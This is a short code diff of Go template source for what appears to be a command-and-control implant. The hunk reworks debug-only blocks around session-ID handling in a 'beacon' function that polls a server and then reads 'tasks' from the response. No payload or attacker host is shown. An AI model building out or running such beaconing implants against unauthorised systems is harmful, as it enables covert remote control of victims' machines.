@@ -958,14 +958,14 @@ func beacon() {
 			sessionMu.Lock()
 			{{if .Debug}}
 			oldSessionID := sessionID
-			{{end}}
 			sessionID = sid
-			sessionMu.Unlock()
-			{{if .Debug}}
 			if oldSessionID != sid {
 				debugLog("Received new session ID: %s", sid)
 			}
+			{{else}}
+			sessionID = sid
 			{{end}}
+			sessionMu.Unlock()
 		}
 		
 		if tasks, ok := response["tasks"].([]interface{}); ok {
